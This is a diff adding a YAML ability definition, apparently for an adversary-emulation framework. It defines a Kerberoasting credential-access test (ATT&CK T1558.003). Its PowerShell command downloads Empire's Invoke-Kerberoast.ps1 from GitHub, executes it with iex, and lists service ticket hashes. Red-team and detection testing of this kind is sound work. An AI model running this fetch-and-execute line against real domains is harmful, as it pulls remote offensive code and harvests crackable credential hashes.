@@ -1,0 +1,26 @@
+---
+- id: 8b5f748da9647a4d9c5a37f20124ba9c
+  name: Request for service tickets
+  description: "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\n\
+    The following are further sources and credits for this attack:\n[Kerberoasting\
+    \ Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n\
+    [Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\n\
+    when executed successfully , the test displays available services with their hashes.\
+    \ \nIf the testing domain doesn't have any service principal name configured,\
+    \ there is no output\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host
+          Joining this computer to a domain must be done manually};  [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1
+          -UseBasicParsing); Invoke-Kerberoast | fl
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
